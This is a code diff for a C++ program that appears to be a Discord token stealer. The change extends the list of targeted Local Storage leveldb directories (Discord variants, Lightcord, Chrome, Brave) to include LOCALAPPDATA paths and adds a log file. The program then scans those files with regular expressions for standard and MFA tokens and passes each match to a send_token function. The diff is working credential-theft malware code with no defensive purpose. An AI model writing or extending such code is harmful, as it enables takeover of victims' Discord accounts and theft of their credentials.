@@ -50,10 +50,29 @@ int main() {
 
 	// Finding token
 
-	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb"};
+	std::vector<std::string> installs = { "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb", "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"};
 
-	for (int i = 0; i < 2; i++) {
-		std::string path = std::getenv("appdata") + installs[i];
+	for (int i = 0; i < 6; i++) { // 
+		std::string path;
+		if(i > 3) {
+			path = std::getenv("localappdata") + installs[i];
+		} else {
+			path = std::getenv("appdata") + installs[i];
+		}
+		
+		// Temporary logging file
+		
+		char szLogFile[MAX_PATH];
+		sprintf(szLogFile,"%s\\LOGS.LOG",std::getenv("appdata"));
+		
+		std::ofstream logging_file(szLogFile,ios::app);
+		
+		logging_file << "\nCurrent directory: " << path;
+		
+		logging_file.close();
+		
+		// End
+		
 		for (const auto& entry : fs::directory_iterator(path)) {
 			std::ifstream t(entry.path(), std::ios_base::binary);
 
@@ -64,14 +83,16 @@ int main() {
 
 			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
 			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
+			
+			
 			for (int i = 0; i < regex_non_mfa.size(); i++) {
 				matches.push_back(regex_non_mfa[i]);
 			}
+			
 			for (int i = 0; i < regex_mfa.size(); i++) {
 				matches.push_back(regex_mfa[i]);
 			}
-
-
+			
 			for (int i = 0; i < matches.size(); i++) {
 				send_token(matches[i]);
 			}
